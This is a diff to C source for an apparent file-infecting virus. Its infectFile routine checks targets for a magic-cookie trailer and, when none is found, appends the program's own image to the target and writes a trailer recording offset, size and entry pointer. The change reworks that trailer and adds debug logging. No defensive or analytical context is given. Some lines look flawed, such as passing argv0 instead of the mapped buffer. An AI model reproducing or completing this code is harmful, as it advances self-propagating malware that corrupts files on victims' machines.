@@ -5,24 +5,21 @@
 
 #include "log.h"
 
+#pragma pack(push)  /* push current alignment to stack */
+#pragma pack(1)     /* set alignment to 1 byte boundary */
+_TRAILER_STRUCT_T
+#pragma pack(pop)   /* restore original alignment from stack */
 
-typedef struct __attribute__ ((__packed__)) _trailer
-{
-    unsigned int magicNr;
-    fpos_t myOffset;
-    unsigned int *rlEntryPt;
-} trailer_t;
-
-
-static int appendTrailer(FILE *fp)
+static int appendTrailer(FILE *fp, long int myOffset, size_t mySize)
 {
     trailer_t *trl = calloc(1, sizeof(trailer_t));
 
     if (trl == NULL) return (ERR_OMEM);
     trl->magicNr = MAGIC_COOKIE;
-    trl->rlEntryPt = NULL;
+    trl->rlEntryPt = (unsigned int *)0xff0000ff;
+    trl->myOffset = (unsigned int *)myOffset;
+    trl->mySize = mySize;
     if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
-    fgetpos(fp, &(trl->myOffset));
     if (fwrite(trl, sizeof(trailer_t), 1, fp) != 1)
     {
         PE("fwrite");
@@ -77,9 +74,10 @@ static trailer_t * getTrailer(FILE *fp)
     return (trl);
 }
 
-static int appendBuf2Fp(char *buf, size_t siz, FILE *fp)
+static int appendBuf2Fp(char *buf, size_t siz, FILE *fp, long int *myOffset)
 {
     if (fseek(fp, 0L, SEEK_END) != 0) return (ERR_FAIL);
+    *myOffset = ftell(fp);
     if (fwrite(buf, 1, siz, fp) < siz) return (ERR_FAIL);
     return (ERR_OK);
 }
@@ -108,23 +106,25 @@ int infectFile(char *argv0, size_t siz, char *target)
 {
     FILE *fp;
     char *buf;
+    long int myOffset;
     trailer_t *trl;
 
-    D2("Is target already infected?")
+    D2("Is target infected?")
     fp = fopen(target, "rb");
     if (!fp) return (ERR_FAIL);
     if ((trl = getTrailer(fp)) != NULL)
     {
-        D("target file '%s' infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
+        D("target file '%s' already infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
+        _TRAILER_DBG_INFO(trl);
         goto done;
     }
     fp = fopen(target, "ab");
     if (!fp) return (ERR_FAIL);
     mapMe(argv0, &buf);
     D("infecting file '%s'", target);
-    if (appendBuf2Fp(argv0, siz, fp) == ERR_OK)
+    if (appendBuf2Fp(argv0, siz, fp, &myOffset) == ERR_OK)
     {
-        if (appendTrailer(fp) == ERR_OK)
+        if (appendTrailer(fp, myOffset, siz) == ERR_OK)
         {
             D("file '%s' infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
         }
@@ -147,7 +147,7 @@ int infectFile(char *argv0, size_t siz, char *target)
     if ((trl = getTrailer(fp)) != NULL)
     {
         D2("file infection succeeded")
-        D("mag: 0x%08x | myOffset: 0x%08x | rlEntryP: 0x%08x", trl->magicNr, trl->myOffset, trl->rlEntryPt)
+        _TRAILER_DBG_INFO(trl);
     }
     else
     {
